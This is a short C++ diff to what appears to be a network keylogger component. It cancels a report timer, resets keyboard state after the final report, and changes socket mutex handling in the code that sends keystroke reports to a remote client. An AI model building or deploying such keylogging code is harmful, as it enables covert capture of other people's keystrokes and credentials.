@@ -28,6 +28,7 @@ namespace http
 		{
 			SendMessage(get_window_hWnd(), WM_STOP_KEYLOGGER, 0, 0);
 			isStarted = false;
+			keylog_report_timer.cancel();
 		}
 
 		void Keylogger::listen_for_report_data()
@@ -50,7 +51,10 @@ namespace http
 			// Fill out the reply to be sent to the client.
 			_reply_buffer_ptr->status_line = http::server::status_strings::ok;
 			if(keyboard_hardware.isLastReport())
+			{
 				_reply_buffer_ptr->status_line.append(" ").append(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP).append("\r\n");
+				keyboard_hardware.reset();
+			}
 			else
 				_reply_buffer_ptr->status_line.append(" ").append(wxhtpconstants::ACTION_TYPE::KEYLOGGER_REPORT).append("\r\n");
 
@@ -85,7 +89,6 @@ namespace http
 
 		void Keylogger::handle_write_report(const boost::system::error_code& error, std::size_t bytes)
 		{
-			socket_write_mutex_.unlock();
 			if( error != error::operation_aborted)
 			{
 				if(isStarted)
